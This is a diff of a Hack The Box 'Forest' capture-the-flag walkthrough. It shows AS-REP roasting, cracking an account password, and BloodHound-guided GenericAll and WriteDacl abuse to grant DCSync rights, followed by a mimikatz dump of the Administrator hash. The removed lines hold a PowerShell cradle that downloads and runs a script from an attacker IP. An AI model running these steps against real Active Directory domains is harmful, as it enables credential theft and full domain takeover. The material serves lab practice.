@@ -6,131 +6,190 @@ tags:
   - windows
   - easy
   - active-directory
+  - genericall
+  - as-rep-roasting
+  - bloodhound
+  - sharphound
+  - writedacl
+  - mimikatz
 ---
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/Forest.png)
 
 ## Information Gathering
 ### Rustscan
 
+Rustscan finds many ports open:
+
 `rustscan --addresses 10.10.10.161 --range 1-65535`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image.png)
 
+Based on the ports open, this machine seems to be an active directory machine.
 
 ## Enumeration
 ### RPC - TCP 135
 
-rpcclient -U "" -N 10.10.10.161
+Let's start with enumerating RPC:
 
-enumdomusers
+`rpccclient -U "" -N 10.10.10.161`
 
+Luckily, we are able to execute commands as the null user.
+
+Executing `enumdomusers`, we get list of users on the system:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-1.png)
+
+We will make a list of users on the system for later attacks:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-2.png)
 
 
 ### LDAP - TCP 389
 
+Next, let's enumerate LDAP. 
+
+We will first query for base namingcontexts:
+
 `ldapsearch -H ldap://10.10.10.161 -x -s base namingcontexts`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-3.png)
+
+**DC=htb,DC=local** seems to be the base.
+
+Luckily, we can bind to LDAP with no credentials. 
+
+Let's forward result for bind on `DC=htb,DC=local` to another file (ldap-null-bing.txt):
 
 `ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" > ldap-null-bing.txt`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-4.png)
 
+Since the result contains thousand of lines, we used the command below to organize it:
+
 `cat ldap-null-bing.txt | awk '{print $1}' | sort | uniq -c | sort -nr > xb-bind-sorted.txt`
 
+Unfortunately, nothing interesting was found from the bind.
 ## AS-REP Roasting
+
+Since we have the list of valid users on the system, let's try **AS-REP Roasting**:
 
 `GetNPUsers.py 'htb.local/' -user users.txt -format hashcat -outputfile hashes -dc-ip 10.10.10.161`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-5.png)
 
+We found user **svc-alfresco** being vulnerable AS-REP Roasting:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-6.png)
 
-```bash
-$krb5asrep$23$svc-alfresco@HTB.LOCAL:b2497b4761f7ce26a5b345a1560fc677$89a32db85e3185d3ac335ccf59a6ee074b8312756f9ff657214c12e48de9471781d46ff7ad10ab37024956cc171f75851d59be2d56eb62bd0e182ed04ccbb34603eb39124eff2c3c1d9603689f1707c1fd9f5699e76400d8edc484dded54f88b8d19b01e108bb54727cbdb3e608c5cd2aa5e0aeb371215f35dd0df22cef313fb7adc673443eacd5629ef413a2d761122e59802688ef28d99d3f8e38ea84e4822d7fb3170c6697df67c8868e06009b9c43a351f40ba96f4a7f28b99bd7b38b0d6ebd843dc8fc6d3e0fc87478fb9034f2c9dc97bd606289f1ac8493c8269f3e8e573e1d29a88d4
-```
+We will pass the hash to hashcat and crack it with rockyou.txt:
 
 `haschat hash rockyou.txt`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/forest-hash.png)
 
-s3rvice
+Hash is cracked in no time and the password is revealed to be **s3rvice**. 
+
+Let's see if the user **svc-alfresco** is in **Remote Management Group** with crackmapexec:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-8.png)
 
+We can now winrm login as the user **svc-alfresco**:
 
 `evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-7.png)
 
 
-## Privesc: svc-alfresco to 
+## Privesc: svc-alfresco to Administrator
+### Bloodhound
 
+Since this is an Active Directory machine, let's enumerate it with SharpHound and Bloodhound.
 
-upload SharpHound.exe
+We will first upload SharpHound.exe:
+
+`upload SharpHound.exe`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-9.png)
 
-./SharpHound.exe
+Let's run it and collect Active Directory information:
+
+`./SharpHound.exe`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-10.png)
 
-download 20240608002914_BloodHound.zip
+After zip file is created, we will download it:
+
+`download 20240608002914_BloodHound.zip`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-11.png)
 
+Now that we have collected Active Directory information, let's start up bloodhound with the command below:
 
 ```bash
 sudo neo4j console
 sudo bloodhound
 ```
 
+After importing the zip file to bloodhound, we can query various analysis.
+
+Checking on shortest path to Domain Admins, we see a valid path form user **svc-alfresco**:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-12.png)
+
+**Svc-alfresco** is a member of **Privileged IT Accounts** and **Privilege IT Account** is a member of **Account Operators**:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-13.png)
 
+**Account Operators** have **Generic All** write to **Exchange Windows Permissions** group and **Exchange Windows Permissions** group has **WriteDacl** write to **HTB.LOCAL**, which contains Domain Admins.
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-14.png)
 
+### GenericALL
+
+We will first perform **GenericAll** attack from **Svc-alfresco** to **Exchange Windows Permissions** group:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-15.png)
+
+Let's add user **svc-alfresco** to **Exchange Windows Permissions** group:
 
 `net group "Exchange Windows Permissions" svc-alfresco /add /domain`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-16.png)
 
+We can confirm the command executed successfully:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-17.png)
+
+### WriteDacl
+
+Now that we are in the **Exchange Windows Permissions** group, let's move on to **WriteDacl** attack:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-18.png)
 
-upload PowerView.ps1
+We will first upload **PowerView.ps1**:
+
+`upload PowerView.ps1`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-19.png)
 
-. ./PowerView.ps1
+After uploading, let's run it:
 
-(New-Object System.Net.WebClient).DownloadString('http://10.10.14.36:8000/PowerView.ps1') | IEX
+`. ./PowerView.ps1`
 
-net group "Exchange Windows Permissions" svc-alfresco /add /domain
+We tried running the commands that will grant user svc-alfresco DCSync right but it seemed that svc-alfresco gets automatically removed from **Exchange Windows Permissions** group every few minutes. 
 
-$SecPass = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
-
-$Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', $SecPass)
-
-Add-ObjectACL -PrincipalIdentity svc-alfresco -Credential $Cred -Rights DCSync
+Let's craft a one-liner command that will add user **svc-alfresco** to **Exchange Windows Permissions** group and grant it permission to DCSync:
 
 ```powershell
 net group "Exchange Windows Permissions" svc-alfresco /add /domain; $Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', (ConvertTo-SecureString 's3rvice' -AsPlainText -Force)); Add-ObjectACL -PrincipalIdentity svc-alfresco -Credential $Cred -Rights DCSync
 ```
 
+After running the command above, we have successfully execute **WriteDacl** attack and we can use mimikatz to obtain hash for Administrator:
 
-lsadump::dcsync /domain:htb.local /user:Administrator
-
-./mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:htb.local /user:Administrator" "exit"
-
+`./mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:htb.local /user:Administrator" "exit"`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-20.png)
+
+Now we have a shell as the administrator:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/forest/image-21.png)
